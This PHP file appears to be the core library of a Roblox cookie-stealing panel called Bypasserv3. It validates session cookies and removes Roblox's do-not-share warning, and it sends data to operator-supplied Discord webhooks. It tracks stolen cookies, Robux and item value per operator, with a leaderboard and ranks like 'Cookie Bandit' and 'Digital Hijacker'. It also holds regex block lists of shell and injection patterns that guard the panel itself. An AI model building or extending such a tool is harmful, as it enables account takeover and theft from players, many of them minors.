<?php
/**
 * Bypasserv3 - Core Functions
 * Security & utility functions
 */

if (!defined('CONFIG_LOADED')) {
    die('Direct access not permitted');
}

/**
 * Sanitize user input
 */
function sanitizeInput($data) {
    if (is_array($data)) {
        return array_map('sanitizeInput', $data);
    }
    
    $data = trim($data);
    $data = stripslashes($data);
    $data = htmlspecialchars($data, ENT_QUOTES, 'UTF-8');
    
    // Block malicious patterns
    $patterns = [
        '/<script[^>]*>.*?<\/script>/is',
        '/<iframe[^>]*>.*?<\/iframe>/is',
        '/javascript:/i',
        '/on\w+\s*=/i',
        '/eval\s*\(/i',
        '/base64_decode/i',
        '/system\s*\(/i',
        '/exec\s*\(/i',
        '/shell_exec/i',
        '/passthru/i',
        '/`.*?`/s',
        '/\$\{.*?\}/s',
        '/\$_(?:GET|POST|REQUEST|COOKIE|SERVER)/i',
        '/<\?php/i',
        '/<\?=/i',
        '/\.\.\//i',
    ];
    
    foreach ($patterns as $pattern) {
        $data = preg_replace($pattern, '', $data);
    }
    
    return $data;
}

/**
 * Validate cookie format
 */
function validateCookie($cookie) {
    $cookie = trim($cookie);
    
    // Remove the warning prefix if present
    $cookie = str_replace('_|WARNING:-DO-NOT-SHARE-THIS.--Sharing-this-will-allow-someone-to-log-in-as-you-and-to-steal-your-ROBUX-and-items.|_', '', $cookie);
    
    // Check length (Roblox cookies are typically 700-1000 characters)
    if (strlen($cookie) < 500 || strlen($cookie) > 2000) {
        return false;
    }
    
    // Check for malicious patterns
    $maliciousPatterns = [
        '/[<>"\']/',
        '/javascript:/i',
        '/<script/i',
        '/\.\.\//i',
        '/union\s+select/i',
        '/drop\s+table/i',
        '/insert\s+into/i',
        '/delete\s+from/i',
        '/update\s+.*set/i',
        '/eval\s*\(/i',
        '/base64_decode/i',
        '/system\s*\(/i',
        '/exec\s*\(/i',
        '/shell_exec/i',
        '/passthru/i',
        '/`.*?`/s',
        '/\$\{.*?\}/s',
        '/<\?php/i',
        '/\$_(?:GET|POST|REQUEST|COOKIE|SERVER)/i',
        '/file_get_contents/i',
        '/file_put_contents/i',
        '/fopen/i',
        '/curl_exec/i',
        '/proc_open/i',
    ];
    
    foreach ($maliciousPatterns as $pattern) {
        if (preg_match($pattern, $cookie)) {
            securityLog('MALICIOUS_COOKIE_DETECTED', [
                'pattern' => $pattern,
                'cookie_length' => strlen($cookie)
            ]);
            return false;
        }
    }
    
    return true;
}

/**
 * Rate limiting
 */
function checkRateLimit($identifier, $maxRequests = 50, $timeWindow = 3600) {
    $rateLimitFile = DATA_PATH . 'rate_limits.json';
    
    // Load rate limit data
    if (file_exists($rateLimitFile)) {
        $rateLimits = json_decode(file_get_contents($rateLimitFile), true);
    } else {
        $rateLimits = [];
    }
    
    $now = time();
    $key = md5($identifier);
    
    // Clean old entries
    foreach ($rateLimits as $k => $data) {
        if ($now - $data['timestamp'] > $timeWindow) {
            unset($rateLimits[$k]);
        }
    }
    
    // Check rate limit
    if (isset($rateLimits[$key])) {
        if ($rateLimits[$key]['count'] >= $maxRequests) {
            if ($now - $rateLimits[$key]['timestamp'] < $timeWindow) {
                securityLog('RATE_LIMIT_EXCEEDED', [
                    'identifier' => $identifier,
                    'count' => $rateLimits[$key]['count']
                ]);
                return false;
            } else {
                $rateLimits[$key] = ['count' => 1, 'timestamp' => $now];
            }
        } else {
            $rateLimits[$key]['count']++;
        }
    } else {
        $rateLimits[$key] = ['count' => 1, 'timestamp' => $now];
    }
    
    // Save rate limit data
    file_put_contents($rateLimitFile, json_encode($rateLimits, JSON_PRETTY_PRINT));
    
    return true;
}

/**
 * Generate secure token
 */
function generateToken($length = 32) {
    $characters = '0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ';
    $token = '';
    
    for ($i = 0; $i < $length; $i++) {
        $token .= $characters[random_int(0, strlen($characters) - 1)];
    }
    
    return $token;
}

/**
 * Security logging
 */
function securityLog($event, $data = []) {
    $logFile = DATA_PATH . 'security.log';
    
    $logEntry = [
        'timestamp' => date('Y-m-d H:i:s'),
        'event' => $event,
        'ip' => $_SERVER['REMOTE_ADDR'] ?? 'unknown',
        'user_agent' => $_SERVER['HTTP_USER_AGENT'] ?? 'unknown',
        'data' => $data
    ];
    
    $logLine = json_encode($logEntry) . PHP_EOL;
    file_put_contents($logFile, $logLine, FILE_APPEND | LOCK_EX);
}

/**
 * Check if user is authenticated
 */
function isAuthenticated() {
    return isset($_SESSION['token']) && !empty($_SESSION['token']);
}

/**
 * Verify token
 */
function verifyToken($token) {
    $tokenFile = DATA_PATH . 'tokens/' . md5($token) . '.json';
    
    if (!file_exists($tokenFile)) {
        return false;
    }
    
    $tokenData = json_decode(file_get_contents($tokenFile), true);
    
    // Check expiration if set
    if (isset($tokenData['expires']) && time() > $tokenData['expires']) {
        unlink($tokenFile);
        return false;
    }
    
    return $tokenData;
}

/**
 * Create token
 */
function createToken($directory, $webhook) {
    $token = generateToken(32);
    $tokenHash = md5($token);
    $tokenFile = DATA_PATH . 'tokens/' . $tokenHash . '.json';
    
    $tokenData = [
        'token' => $token,
        'directory' => $directory,
        'webhook' => $webhook,
        'created' => time(),
        'expires' => null // No expiration by default
    ];
    
    file_put_contents($tokenFile, json_encode($tokenData, JSON_PRETTY_PRINT));
    
    return $token;
}

/**
 * Get global statistics
 */
function getGlobalStats() {
    $globalStatsFile = dirname(DATA_PATH) . '/global_stats.json';
    
    if (!file_exists($globalStatsFile)) {
        $stats = [
            'totalSites' => 0,
            'totalInstances' => 0,
            'totalCookies' => 0,
            'totalVisits' => 0,
            'lastUpdated' => time()
        ];
        file_put_contents($globalStatsFile, json_encode($stats, JSON_PRETTY_PRINT));
        return $stats;
    }
    
    return json_decode(file_get_contents($globalStatsFile), true);
}

/**
 * Update global statistics
 */
function updateGlobalStats($key, $increment = 1) {
    $stats = getGlobalStats();
    
    if (isset($stats[$key])) {
        $stats[$key] += $increment;
    } else {
        $stats[$key] = $increment;
    }
    
    $stats['lastUpdated'] = time();
    
    $globalStatsFile = dirname(DATA_PATH) . '/global_stats.json';
    file_put_contents($globalStatsFile, json_encode($stats, JSON_PRETTY_PRINT));
}

/**
 * Get instance data
 */
function getInstanceData($directory) {
    $instancePath = DATA_PATH . $directory . '/';
    
    if (!is_dir($instancePath)) {
        return null;
    }
    
    // Get stats
    $statsFile = $instancePath . 'stats.json';
    $stats = file_exists($statsFile) ? json_decode(file_get_contents($statsFile), true) : [
        'totalCookies' => 0,
        'totalVisits' => 0,
        'totalRobux' => 0,
        'totalRAP' => 0,
        'totalSummary' => 0,
        'lastUpdated' => time()
    ];
    
    // Get daily stats
    $dailyStatsFile = $instancePath . 'daily_stats.json';
    $dailyStats = file_exists($dailyStatsFile) ? json_decode(file_get_contents($dailyStatsFile), true) : [
        'cookies' => array_fill(0, 7, 0),
        'visits' => array_fill(0, 7, 0),
        'robux' => array_fill(0, 7, 0),
        'rap' => array_fill(0, 7, 0),
        'summary' => array_fill(0, 7, 0)
    ];
    
    // Get settings
    $settingsFile = $instancePath . 'settings.json';
    $settings = file_exists($settingsFile) ? json_decode(file_get_contents($settingsFile), true) : [
        'username' => 'beammer',
        'profilePicture' => 'https://hyperblox.eu/files/img.png'
    ];
    
    return [
        'stats' => $stats,
        'dailyStats' => $dailyStats,
        'username' => $settings['username'],
        'profilePicture' => $settings['profilePicture']
    ];
}

/**
 * Update instance stats
 */
function updateInstanceStats($directory, $key, $value) {
    $instancePath = DATA_PATH . $directory . '/';
    
    if (!is_dir($instancePath)) {
        return false;
    }
    
    $statsFile = $instancePath . 'stats.json';
    $stats = file_exists($statsFile) ? json_decode(file_get_contents($statsFile), true) : [
        'totalCookies' => 0,
        'totalVisits' => 0,
        'totalRobux' => 0,
        'totalRAP' => 0,
        'totalSummary' => 0,
        'lastUpdated' => time()
    ];
    
    $stats[$key] = $value;
    $stats['lastUpdated'] = time();
    
    file_put_contents($statsFile, json_encode($stats, JSON_PRETTY_PRINT));
    return true;
}

/**
 * Update daily stats
 */
function updateDailyStats($directory, $category, $value) {
    $instancePath = DATA_PATH . $directory . '/';
    
    if (!is_dir($instancePath)) {
        return false;
    }
    
    $dailyStatsFile = $instancePath . 'daily_stats.json';
    $dailyStats = file_exists($dailyStatsFile) ? json_decode(file_get_contents($dailyStatsFile), true) : [
        'cookies' => array_fill(0, 7, 0),
        'visits' => array_fill(0, 7, 0),
        'robux' => array_fill(0, 7, 0),
        'rap' => array_fill(0, 7, 0),
        'summary' => array_fill(0, 7, 0)
    ];
    
    $dayOfWeek = date('w'); // 0 (Sunday) to 6 (Saturday)
    
    if (isset($dailyStats[$category])) {
        $dailyStats[$category][$dayOfWeek] += $value;
    }
    
    file_put_contents($dailyStatsFile, json_encode($dailyStats, JSON_PRETTY_PRINT));
    return true;
}

/**
 * Get rank information based on cookies collected
 */
function getRankInfo($cookies) {
    $ranks = [
        ['name' => 'Noob Beamer', 'min' => 0, 'max' => 2, 'color' => '#9ca3af', 'icon' => '🔰'],
        ['name' => 'Rookie Logger', 'min' => 3, 'max' => 9, 'color' => '#84cc16', 'icon' => '📝'],
        ['name' => 'Script Kiddie', 'min' => 10, 'max' => 25, 'color' => '#22c55e', 'icon' => '👍'],
        ['name' => 'Amateur Beamer', 'min' => 26, 'max' => 49, 'color' => '#10b981', 'icon' => '✨'],
        ['name' => 'Lowkey Harvester', 'min' => 50, 'max' => 74, 'color' => '#06b6d4', 'icon' => '⭐'],
        ['name' => 'Log Collector', 'min' => 75, 'max' => 99, 'color' => '#3b82f6', 'icon' => '🏆'],
        ['name' => 'Token Hunter', 'min' => 100, 'max' => 149, 'color' => '#6366f1', 'icon' => '💎'],
        ['name' => 'Cookie Bandit', 'min' => 150, 'max' => 199, 'color' => '#8b5cf6', 'icon' => '🎯'],
        ['name' => 'Silent Snatcher', 'min' => 200, 'max' => 299, 'color' => '#a855f7', 'icon' => '👑'],
        ['name' => 'Seasoned Harvester', 'min' => 300, 'max' => 399, 'color' => '#d946ef', 'icon' => '🔥'],
        ['name' => 'Digital Hijacker', 'min' => 400, 'max' => 499, 'color' => '#ec4899', 'icon' => '⚡'],
        ['name' => 'Beam Technician', 'min' => 500, 'max' => 599, 'color' => '#f43f5e', 'icon' => '💫'],
        ['name' => 'Advanced Extractor', 'min' => 600, 'max' => 699, 'color' => '#ef4444', 'icon' => '🌟'],
        ['name' => 'Cyber Phantom', 'min' => 700, 'max' => 799, 'color' => '#dc2626', 'icon' => '👻'],
        ['name' => 'Professional Beamer', 'min' => 800, 'max' => 899, 'color' => '#b91c1c', 'icon' => '💀'],
        ['name' => 'Ultimate Logger', 'min' => 900, 'max' => 999, 'color' => '#991b1b', 'icon' => '🚀'],
        ['name' => 'Hyperblox', 'min' => 1000, 'max' => PHP_INT_MAX, 'color' => '#7c3aed', 'icon' => '⚔️']
    ];
    
    $currentRank = $ranks[0];
    $nextRank = $ranks[1];
    $progress = 0;
    
    foreach ($ranks as $index => $rank) {
        if ($cookies >= $rank['min'] && $cookies <= $rank['max']) {
            $currentRank = $rank;
            
            if (isset($ranks[$index + 1])) {
                $nextRank = $ranks[$index + 1];
                $rangeSize = $rank['max'] - $rank['min'] + 1;
                $currentProgress = $cookies - $rank['min'];
                $progress = ($currentProgress / $rangeSize) * 100;
            } else {
                $nextRank = $rank; // Max rank reached
                $progress = 100;
            }
            
            break;
        }
    }
    
    return [
        'current' => $currentRank,
        'next' => $nextRank,
        'progress' => round($progress, 1),
        'cookiesToNext' => max(0, $nextRank['min'] - $cookies)
    ];
}

/**
 * Get leaderboard data
 */
function getLeaderboard($limit = 10) {
    $instances = [];
    $dataDir = DATA_PATH;
    
    // Scan all directories
    $directories = array_diff(scandir($dataDir), ['.', '..', 'tokens']);
    
    foreach ($directories as $dir) {
        $instancePath = $dataDir . $dir . '/';
        
        if (!is_dir($instancePath)) {
            continue;
        }
        
        $data = getInstanceData($dir);
        
        if ($data) {
            $instances[] = [
                'directory' => $dir,
                'username' => $data['username'],
                'profilePicture' => $data['profilePicture'],
                'totalCookies' => $data['stats']['totalCookies'] ?? 0,
                'totalVisits' => $data['stats']['totalVisits'] ?? 0,
                'totalRobux' => $data['stats']['totalRobux'] ?? 0,
                'totalRAP' => $data['stats']['totalRAP'] ?? 0
            ];
        }
    }
    
    // Sort by cookies (descending)
    usort($instances, function($a, $b) {
        return $b['totalCookies'] - $a['totalCookies'];
    });
    
    return array_slice($instances, 0, $limit);
}

/**
 * Validate webhook URL
 */
function validateWebhook($webhook) {
    // Check if it's a valid Discord webhook
    if (!preg_match('/^https:\/\/discord\.com\/api\/webhooks\/\d+\/[\w-]+$/', $webhook)) {
        return false;
    }
    
    // Try to verify webhook exists
    $ch = curl_init($webhook);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    curl_setopt($ch, CURLOPT_NOBODY, true);
    curl_setopt($ch, CURLOPT_TIMEOUT, 5);
    curl_exec($ch);
    $httpCode = curl_getinfo($ch, CURLINFO_HTTP_CODE);
    curl_close($ch);
    
    return $httpCode === 200;
}

/**
 * Send Discord webhook
 */
function sendWebhook($webhook, $data) {
    $ch = curl_init($webhook);
    
    curl_setopt($ch, CURLOPT_HTTPHEADER, ['Content-Type: application/json']);
    curl_setopt($ch, CURLOPT_POST, 1);
    curl_setopt($ch, CURLOPT_POSTFIELDS, json_encode($data));
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    curl_setopt($ch, CURLOPT_TIMEOUT, 10);
    
    $response = curl_exec($ch);
    $httpCode = curl_getinfo($ch, CURLINFO_HTTP_CODE);
    curl_close($ch);
    
    return $httpCode >= 200 && $httpCode < 300;
}

/**
 * Create instance directory structure
 */
function createInstance($directory, $webhook) {
    $instancePath = DATA_PATH . $directory . '/';
    
    // Check if directory exists
    if (file_exists($instancePath)) {
        return ['success' => false, 'error' => 'Directory already exists'];
    }
    
    // Validate directory name (alphanumeric only)
    if (!preg_match('/^[a-zA-Z0-9_-]+$/', $directory)) {
        return ['success' => false, 'error' => 'Invalid directory name'];
    }
    
    // Create directory
    if (!mkdir($instancePath, 0755, true)) {
        return ['success' => false, 'error' => 'Failed to create directory'];
    }
    
    // Create stats file
    $stats = [
        'totalCookies' => 0,
        'totalVisits' => 0,
        'totalRobux' => 0,
        'totalRAP' => 0,
        'totalSummary' => 0,
        'lastUpdated' => time()
    ];
    file_put_contents($instancePath . 'stats.json', json_encode($stats, JSON_PRETTY_PRINT));
    
    // Create daily stats file
    $dailyStats = [
        'cookies' => array_fill(0, 7, 0),
        'visits' => array_fill(0, 7, 0),
        'robux' => array_fill(0, 7, 0),
        'rap' => array_fill(0, 7, 0),
        'summary' => array_fill(0, 7, 0)
    ];
    file_put_contents($instancePath . 'daily_stats.json', json_encode($dailyStats, JSON_PRETTY_PRINT));
    
    // Create settings file
    $settings = [
        'username' => 'beammer',
        'profilePicture' => 'https://hyperblox.eu/files/img.png',
        'webhook' => $webhook,
        'created' => time()
    ];
    file_put_contents($instancePath . 'settings.json', json_encode($settings, JSON_PRETTY_PRINT));
    
    // Create token
    $token = createToken($directory, $webhook);
    
    // Update global stats
    updateGlobalStats('totalInstances', 1);
    
    return [
        'success' => true,
        'token' => $token,
        'directory' => $directory,
        'webhook' => $webhook
    ];
}

/**
 * Get client IP address
 */
function getClientIP() {
    $ipKeys = [
        'HTTP_CLIENT_IP',
        'HTTP_X_FORWARDED_FOR',
        'HTTP_X_FORWARDED',
        'HTTP_X_CLUSTER_CLIENT_IP',
        'HTTP_FORWARDED_FOR',
        'HTTP_FORWARDED',
        'REMOTE_ADDR'
    ];
    
    foreach ($ipKeys as $key) {
        if (array_key_exists($key, $_SERVER)) {
            $ip = explode(',', $_SERVER[$key])[0];
            $ip = trim($ip);
            
            if (filter_var($ip, FILTER_VALIDATE_IP)) {
                return $ip;
            }
        }
    }
    
    return 'unknown';
}

?>
